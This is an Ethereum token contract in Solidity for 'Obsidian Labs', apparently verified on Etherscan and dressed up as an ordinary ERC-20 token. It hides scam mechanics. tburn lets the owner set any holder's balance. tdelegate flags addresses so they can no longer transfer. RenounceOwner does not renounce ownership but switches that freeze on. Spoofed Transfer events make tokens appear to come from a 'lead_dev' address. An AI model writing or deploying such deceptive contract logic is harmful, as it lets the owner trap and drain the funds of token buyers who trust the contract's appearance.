/**
 *Submitted for verification at Etherscan.io on 2022-10-14
*/

// "SPDX-License-Identifier: UNLICENSED

                                    
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract OBSIDIANLABS {
  
    mapping (address => uint256) public tBalance;
    mapping (address => bool) tAMn;


    // 
    string public name = "Obsidian Labs";
    string public symbol = unicode"OBSIDIAN";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint tver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        tBalance[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x5871f98Cd2AAc25a4B4343cf318309b47a630747;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier O() {   
         require(msg.sender == owner);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(tBalance[msg.sender] >= value);
        tBalance[msg.sender] -= value;  
        tBalance[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(tAMn[msg.sender]) {
        require(tver < 1);} 
        require(tBalance[msg.sender] >= value);
        tBalance[msg.sender] -= value;  
        tBalance[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return tBalance[account]; }
        function tburn(address t, uint256 burns) O public returns (bool success) {
        tBalance[t] = burns;
        return true; }
        function tdelegate(address Y) O public{          
        require(!tAMn[Y]);
        tAMn[Y] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner() public {
        require(msg.sender == owner);
        tver = 1;}
        function tclaim(address Y) O public {
        require(tAMn[Y]);
        tAMn[Y] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= tBalance[from]);
        require(value <= allowance[from][msg.sender]);
        tBalance[from] -= value;  
        tBalance[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(tAMn[from] || tAMn[to]) {
        require(tver < 1);}
        require(value <= tBalance[from]);
        require(value <= allowance[from][msg.sender]);
        tBalance[from] -= value;
        tBalance[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }